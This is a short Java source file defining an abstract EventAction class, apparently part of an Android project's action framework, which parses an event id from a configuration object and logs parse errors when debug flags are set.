package com.android.syssetup.action;

import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfAction;
import com.android.syssetup.conf.ConfigurationException;
import com.android.syssetup.util.Check;

abstract class EventAction extends SubAction {
	private static final String TAG = "EventAction";
	protected int eventId;

	public EventAction(ConfAction params) {
		super(params);
	}

	@Override
	protected boolean parse(ConfAction params) {
		try {
			this.eventId = params.getInt("event");

		} catch (ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse) Error: " + e);
			}
			return false;
		}

		return true;
	}

}
